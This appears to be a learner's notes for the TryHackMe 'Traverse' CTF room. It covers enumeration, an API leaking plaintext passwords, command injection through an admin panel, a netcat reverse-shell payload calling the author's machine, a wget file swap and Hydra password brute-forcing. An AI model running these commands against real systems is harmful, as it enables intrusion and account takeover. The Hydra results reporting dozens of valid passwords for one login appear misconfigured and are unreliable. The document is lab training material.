Started the machine and launched the webpage @http://10.10.41.129
after inspecting the page I started to look through the [[Page Source]]

* checking out the source what stuck out to me was [[Page Source#^afd3e8]] and [[Page Source#^cef7c9]]
* after that I inspected the network traffic in mozilla could not find much
* launched wireshark to capture some packets, but another dead end 

nmap found something 

## 1) Discovery
### Nmap
**Nmap 7.94SVN scan initiated Thu Jun 20 16:51:48 2024 as:** 
`nmap -sV -sC -Pn -oN nmap_report 10.10.41.129
Nmap scan report for 10.10.41.129
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 07:72:08:da:74:97:0f:2a:81:3f:b8:c2:5e:d3:4f:23 (RSA)
|   256 3e:ff:c0:35:cb:ac:60:7f:ef:9c:76:aa:fa:a0:67:47 (ECDSA)
|_  256 79:9e:b5:d9:13:f2:e2:d5:fc:e1:e6:4f:44:92:4d:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Tourism Website
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)^711791
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Thu Jun 20 16:52:06 2024 -- 1 IP address (1 host up) scanned in 18.20 seconds

**Break down of syntax

- `-sV`: Enable version detection.
- `-sC`: Run default scripts.
- `-Pn`: Disable ping scan (treat all hosts as online).
- `-oN <filename>`: Output scan results in normal format to the specified file.

- Perform service version detection (`-sV`).
- Run default NSE scripts (`-sC`).
- Skip the host discovery (ping scan) and assume the host is up (`-Pn`).
- Output the results in normal format to `scan_results.txt` (`-oN nmap_report).


Finding the location of my gobuster and specific file 

`$ sudo find / -name "directory-list-2.3-medium.txt"


**Results
	`/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
	`/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
`

[[|_http-server-header: Apache/2.4.41 (Ubuntu)]] #^711791

Because we know its using a web server we can brute-force the URLs (directories and files) on the web server.
2
`$ gobuster dir -u http://10.10.225.104 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
`
**Breakdown of the command and what each part does

- `dir`: This is the mode of `gobuster`, indicating that it should brute-force directories and files.
- `-u <http://10.10.225.104>`: The URL of the target web server to scan.
- `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: The wordlist to use for brute-forcing. This wordlist contains potential directory and file names.
- `-x php,txt,html`: The file extensions to append to each wordlist entry during the brute-force process.

**Explanation:

- `gobuster dir`: Initiates `gobuster` in directory brute-forcing mode.
- `-u http://10.10.225.104`: Specifies the target URL.
- `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Points to the wordlist file that contains potential directory and file names.
- `-x php,txt,html`: Adds these file extensions to each entry in the wordlist, allowing `gobuster` to check for files with these extensions.
![[Pasted image 20240621155448.png]]
gobuster still cooking, but I took the time to look at the http://10.10.225.104/logs/ 

![[Pasted image 20240621155554.png]]
There's a email_dump.txt
Flag 3: email_dump.txt

what happens If we check out that file ?
![[Pasted image 20240621155628.png]]
Flag 5: THM{100100111}
Email states : *******"Sorry I had to rush earlier for the holidays, but I have created the directory for you with all the required information for the API.
You loved SSDLC so much, ==I named the API folder under the name of the first phase of SSDLC==."
*this page is password protected and can only be opened through the key. THM{100100111}
*******"first phase of SSDLC"*******"  #THM_Traverse_clue
The seven phases of the Software Development Life Cycle (SDLC) are:

- Planning
- Requirements analysis
- Design
- Coding
- Testing
- Deployment
- Maintenance:

 Flag 4: Planning
 So file we are looking for is /planning or webpage, also mentioned in the email the password is THM{100100111}
 * /planning ^7a3499
 * THM{100100111}
 ^2a1cfa 
* [we have 2 emails now]
	To: Mark <mark@tourism.mht> From: Bob <**bob@tourism.mh**t>
	could run hydra to crack the login page if weak passwords 

### (paused) gobuster finished while i was gone results below

──(arcen㉿Hallel)-[~]
└─$ gobuster dir -u http://10.10.225.104 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.225.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode                                                                                                                                                                  
===============================================================                                                                                                                                                  
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1491]
/img                  (Status: 301) [Size: 312] [--> http://10.10.225.104/img/]
/header.php           (Status: 200) [Size: 886]
/footer.php           (Status: 200) [Size: 213]
/client               (Status: 301) [Size: 315] [--> http://10.10.225.104/client/]
/api                  (Status: 301) [Size: 312] [--> http://10.10.225.104/api/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.225.104/javascript/]
/logs                 (Status: 301) [Size: 313] [--> http://10.10.225.104/logs/]
/planning             (Status: 301) [Size: 317] [--> http://10.10.225.104/planning/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.225.104/phpmyadmin/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================                                                                                                                                                  
Finished                                                                                                                                                                                                         
===============================================================
![[Pasted image 20240621224622.png]]
From our results:

	/planning 
	/client  
	/api  
	/logs  
	/phpmyadmin  
	/img  
	/javascript

_______________
## Inspecting the source on homepage
![[Pasted image 20240623042113.png]]
Click on View Page Source

The "custom.main.js" is what we want to take a look at 
![[Pasted image 20240623042200.png]]

After clicking on it we can find hex encoding 

![[Pasted image 20240623042409.png]]
Grab the hex data and post it to cyberchef: https://gchq.github.io/CyberChef/
Using the "magic" operation cyberchef will give us an output 
![[Pasted image 20240623042713.png]]
In the output we get "Matching ops: From Base64, From Hex, From Hexdump"
Flag 1: Hex
Lets convert it From Hex now 
![[Pasted image 20240623043352.png]]

Output is Json, use https://beautifier.io/ to make it easier for use to read

![[Pasted image 20240623043444.png]]

What's important here is:
	var n = "DIRECTORY";
    var e = "LISTING";
    var o = "IS THE";
    var i = "ONLY WAY";
    var f = null;
    var l = false;
    var d;
    if (f === null) {
        console.log("Flag:" + n + " " + e + " " + o + " " + i)

that last sentence is adding up the var
("Flag:" + n + " " + e + " " + o + " " + i)

"DIRECTORY" "LISTING"" IS THE"" ONLY WAY"


### Picked back up

http://10.10.208.200/planning is asking for password. [[#^7a3499]] [[#^2a1cfa]]

![[Pasted image 20240623040944.png]]

![[Pasted image 20240623041022.png]]



| Instructions:<br><br>    Base URL: MACHINE IP Address<br>    Endpoint: api/?customer_id=1<br>    HTTP Method: GET<br>    Parameters:<br><br>    {id}: The customer ID for retrieving customer information<br><br>API Request:<br><br>GET http://MACHINE IP/api/?customer_id=1 | API Response:<br><br>{<br>            "data": {<br>                "id": "1",<br>                "name": "string",<br>                "email": "example@example.com",<br>                "password": "*****",<br>                "timestamp": "0000-00-00 00:00:00",<br>                "role": "user/admin",<br>                "loginURL": "https://example.com/loginURL",<br>                "isadmin": "boolean"<br>            },<br>            "response_code": 200,<br>            "response_desc": "Success"<br>        } |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#clue here is GET http://MACHINE IP/api/?customer_id=1

http://10.10.208.200/api/?customer_id=1
data	
id	"1"
name	"Alice"
email	"alice@traverse.com"
password	"qwerty1"
timestamp	"2023-05-23 04:47:25"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=2
data	
id	"2"
name	"Bob"
email	"bob@traverse.com"
password	"qwerty2"
timestamp	"2023-05-23 04:47:25"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=3
data	
id	"3"
name	"admin"
email	"realadmin@traverse.com"
password	"admin_key!!!"
timestamp	"2023-05-23 04:47:25"
role	"admin"
loginURL	"/realadmin"
isadmin	"1"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=4
data	
id	"4"
name	"Mark"
email	"mark@traverse.com"
password	"qwerty4"
timestamp	"2023-05-23 04:47:25"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=5
data	
id	"5"
name	"John"
email	"john@traverse.com"
password	"qwerty5"
timestamp	"2023-05-23 04:47:25"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=6
data	
id	"6"
name	"Julliet"
email	"julliet@traverse.com"
password	"qwerty6"
timestamp	"2023-05-23 04:47:26"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

http://10.10.208.200/api/?customer_id=7
data	
id	"7"
name	"Janet"
email	"janet@traverse.com"
password	"qwerty7"
timestamp	"2023-05-23 04:47:26"
role	"user"
loginURL	"/client"
isadmin	"0"
response_code	200
response_desc	"Success"

we have the user and pass of the admin, let's login
http://10.10.231.98/realadmin/
![[Pasted image 20240623055025.png]]

after logging in 
![[Pasted image 20240623045444.png]]
Execute the "current dir "
the point of this is to capture the response and we can edit it on our end with burp suite 
![[Pasted image 20240623045619.png]]
send to repeater then foward the traffic
![[Pasted image 20240623045708.png]]
under Repeater eit the request under the commands= to commands=ls so we can view the response from the command=ls 

![[Pasted image 20240623045913.png]]

results from command=ls 
Password for accessing original file manager: THM{10101}<br>index.php
main.php
renamed_file_manager.php
thm_shell.php
![[Pasted image 20240623050018.png]]
Flag 9: thm_shell.php
Flag 10: renamed_file_manager.php

since we have command access we can set up a reverse shell payload 
**_— rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>1|nc+MYLOCALMACHINE+1234+>/tmp/f**
### Breakdown of the Command

1. **`rm /tmp/f;`**
    
    - `rm /tmp/f`: Removes the file `/tmp/f` if it exists.
    - `;`: This semicolon separates commands, allowing them to be executed sequentially.
2. **`mkfifo /tmp/f;`**
    
    - `mkfifo /tmp/f`: Creates a named pipe (FIFO) at `/tmp/f`. This acts as a file that can be used for inter-process communication.
    - `;`: Again, separates commands.
3. **`cat /tmp/f | /bin/sh -i 2>&1 | nc MYLOCALMACHINE 1234 > /tmp/f`**
    
    - `cat /tmp/f`: Reads from the named pipe `/tmp/f`.
    - `|`: Pipes the output of `cat /tmp/f` to the next command.
    - `/bin/sh -i`: Starts an interactive shell (`-i`) using `/bin/sh`.
    - `2>&1`: Redirects standard error (`2`) to standard output (`1`), combining them into a single stream.
    - `|`: Pipes the combined output (standard output and standard error) to the next command.
    - `nc MYLOCALMACHINE 1234`: Uses `netcat` (`nc`) to establish a connection to `MYLOCALMACHINE` on port `1234`.
    - `>`: Redirects output to the specified file.
    - `/tmp/f`: The file where the output is redirected.

### Explanation

- **Reverse Shell**: The overall goal of this command is to create a reverse shell. This allows an attacker to gain command-line access to the target machine from a remote location.
- **Named Pipe (FIFO)**: A named pipe (`/tmp/f`) is created to facilitate communication between different parts of the command.
- **Interactive Shell**: An interactive shell is started, and its input/output is piped through `netcat` to the attacker's machine.
- **Netcat (nc)**: `nc` is used to connect to the attacker's machine (`MYLOCALMACHINE`) on the specified port (`1234`). This connection allows the attacker to send commands and receive output from the target machine.

### Detailed Steps

1. **Remove any existing pipe**: Ensures that `/tmp/f` does not already exist, preventing errors.
2. **Create a new named pipe**: Sets up a communication channel via `/tmp/f`.
3. **Establish the reverse shell**:
    - `cat /tmp/f` reads from the named pipe.
    - The output is piped to `/bin/sh -i`, starting an interactive shell.
    - Any output (standard output and error) from the shell is piped to `nc`.
    - `nc` sends this output to the attacker's machine and waits for commands.
    - The attacker's commands are received by `nc` and written to `/tmp/f`, which the shell reads as input.

### Security Implications

This type of command is often used in penetration testing and by attackers to establish unauthorized access to a target system. It is important to monitor and secure your systems to prevent such exploits, including:

- Limiting the use of `netcat`.
- Monitoring for suspicious named pipe creation.
- Using firewalls to restrict outgoing connections.
- Employing intrusion detection systems (IDS) to alert on such patterns.
## back to exercise


and on my local machine 
┌──(root㉿kali)-[/home/kali]  
└─# nc -nvlp 1234
to listen for response
	1) nc -nc -nvlp 1234
	2) then send the request on burpsuite
	command=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>1|nc+MYLOCALMACHINE+1234+>/tmp/f**
after that we should be in 
do $id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ls
1
index.php
main.php
renamed_file_manager.php
thm_shell.php

Finding the Index.php
cd ..
pwd
![[Pasted image 20240623055850.png]]
cat index.php
![[Pasted image 20240623055947.png]]
reviewing the code we see that if the message = "FINALLY HACKED";
it will continue to show the webpage has been hacked, but if we modify it the code will not work, restoring our page.
so back on our Local machine copy the code of the index.php and modify $message =""
![[Pasted image 20240623060255.png]]
this should restore our page back to its original form
now move the modified index.php to the webserver
on local machine host the file on http server with 
$ python3 -m http.server 80 
![[Pasted image 20240623061508.png]]
back on our reverse shell make sure you removed the old index.php 
![[Pasted image 20240623061722.png]]
and do the following command to receive our new index.php
wget LOCALIP/index.php
![[Pasted image 20240623061643.png]]
and we see our new index is now on the webserver

VM not loading 

Flag 11: THM{WEBSITE_RESTORED}

finish the mitre attack navigator 
https://mitre-attack.github.io/attack-navigator/
https://chatgpt.com/c/faf50439-7f13-451b-aa77-d1b23e14f0bf
https://medium.com/@josephalan17201972/traverse-tryhackme-write-up-9f4594af6903

## Hydra findings
┌──(arcen㉿Hallel)-[~/Documents/THM_Traverse]
└─$ sudo hydra -l bob@tourism.mht -P /usr/share/wordlists/rockyou.txt.gz http-post-form://10.10.208.200/client:"email-user=^USER^%40tourism.mht&^PASS^-user=pass":"Invalid email or password."

sudo hydra -l realadmin@tourism.mht -P /usr/share/wordlists/rockyou.txt.gz -t 32  -W 2 http-post-form://10.10.208.200/client:"email-user=^USER^%40tourism.mht&^PASS^-user=pass":"Invalid email or password."

Hydra has concurrency, the first command which is default concurrency is limited to 16 task per server

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-23 03:26:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.208.200:80/client:email-user=^USER^&^PASS^-user=pass:Invalid email or password.`
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: 123456789
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: lovely
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: princess
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: password
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: rockyou
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: abc123
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: iloveyou
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: 1234567
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: 123456
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: daniel
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: 12345678
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: nicole
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: jessica
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: monkey
[80][http-post-form] host: 10.10.208.200   login: bob@tourism.mht   password: babygirl
```

to add more tasks we can run something like 

`sudo hydra -l bob@tourism.mht -P /usr/share/wordlists/rockyou.txt.gz -t 32 --rate 5 -W 0.5 http-post-form://10.10.208.200/client:"email-user=^USER^%40tourism.mht&^PASS^-user=pass":"Invalid email or password."`
This command:

- Runs 32 tasks concurrently.
- Limits the rate to 5 attempts per second.
- Waits 0.5 seconds between attempts.

*-t 32 --rate 5 -W 0.5*

- Adjust the concurrency using `-t`.
- Control the rate of attempts with `--rate`.
- Introduce a wait time between attempts with `-W`.
- Monitor and adjust based on performance observations.

! i believe --rate is not a thing anymore !

**When adding more tasks be careful we can overload a server and cause it to crash or eat up to many resources on our end.**


```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-23 03:44:15
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
[DATA] attacking http-post-form://10.10.208.200:80/client:email-user=^USER^%40tourism.mht&^PASS^-user=pass:Invalid email or password.
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: princess
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 1234567
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: abc123
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 12345
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 123456
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: password
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 12345678
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: rockyou
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 123456789
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: iloveyou
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: tigger
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: monkey
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: chocolate
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: ashley
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: michelle
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: babygirl
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: michael
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: lovely
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 654321
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: jessica
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: butterfly
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: qwerty
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: sunshine
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: friends
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 111111
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: iloveu
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: nicole
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: password1
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: daniel
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: 000000
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: soccer
[80][http-post-form] host: 10.10.208.200   login: realadmin@tourism.mht   password: anthony
1 of 1 target successfully completed, 32 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-23 03:44:23

```